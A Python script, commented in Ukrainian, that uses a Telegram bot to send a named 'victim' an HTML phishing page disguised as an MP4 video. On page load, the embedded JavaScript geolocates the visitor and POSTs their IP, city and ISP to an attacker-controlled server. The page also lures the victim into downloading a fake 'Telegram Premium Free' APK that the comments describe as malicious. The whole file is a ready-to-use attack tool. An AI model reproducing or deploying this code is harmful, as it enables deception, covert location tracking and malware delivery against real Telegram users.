import requests # імпортуємо бібліотеку для http запитів

# Телеграм-бот: потрібно створити в @BotFather і отримати токен
BOT_TOKEN = "xxxxxx:xxxxxxxxxxxxxxxxxx"

# Telegram ID жертви (його можна отримати через @userinfobot)
CHAT_ID = "xxxxxxxxxxxxxx" # Telegram ID жертви

# HTML-код фішингової сторінки
html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Store</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: auto;
        }
        h2 {
            color: #333;
        }
        .btn {
            display: inline-block;
            background: #28a745;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 10px;
        }
        .btn:hover {
            background: #218838;
        }
    </style>
    <script>
        fetch('http://ip-api.com/json')
            .then(response => response.json())
            .then(data => {
            // ВАЖЛИВО! Тут потрібно вказати IP-адресу вашого сервера замість XX.XX.XX.XX
            // Сервер повинен бути налаштований на прийом POST-запитів за цим шляхом (/log_ip). Дивіться скрипт server_logger.py
                fetch('http://XX.XX.XX.XX:5000/log_ip', {  
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        ip: data.query,
                        country: data.country,
                        region: data.regionName,
                        city: data.city,
                        isp: data.isp
                    })
                });
            })
            .catch(error => console.error('Error fetching IP:', error));
    </script>
</head>
<body>
    <div class="container">
        <h2>Telegram Store</h2>
        <p>Завантажте безкоштовно Telegram Premium і вас чекає подарунок!</p>
        <p>New app: Telegram Premium Free</p>
        <p><strong>Size:</strong> 15MB | <strong>Version:</strong> 1.0.1</p>
        <a href="https://example.com/fakeapp.apk" class="btn">Завантажити APK</a>
        <!-- Посилання на шкідливий APK-файл -->
    </div>
</body>
</html>
"""

# Створюємо файл, у який записуємо HTML-код (маскується під відеофайл)
html_path = "testv.mp4"
with open(html_path, "w") as file:
    file.write(html_content)

# Підготовка файлу для надсилання в Telegram
files = {
    "video": (
        "a.htm",
        open(html_path, "rb"),  
        "video/mp4"
    )
}

# Посилання на API Telegram для надсилання відеофайлу
url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"

# Посилання на обкладинку для фейкового відео
cover_url = "https://github.com/drconfig/telegram-video-extension-manipulation-PoC/blob/addcover/blue.jpg?raw=true"

# Формуємо дані для відправки
data = {"chat_id": CHAT_ID, "supports_streaming": False , "cover" : cover_url}
response = requests.post(url, data=data, files=files)

# Відправляємо запит в Telegram API
if response.status_code == 200:
    print("message send") # Повідомлення успішно надіслане
else:
    print(f"Hata: {response.text}") # Виводимо помилку, якщо щось пішло не так
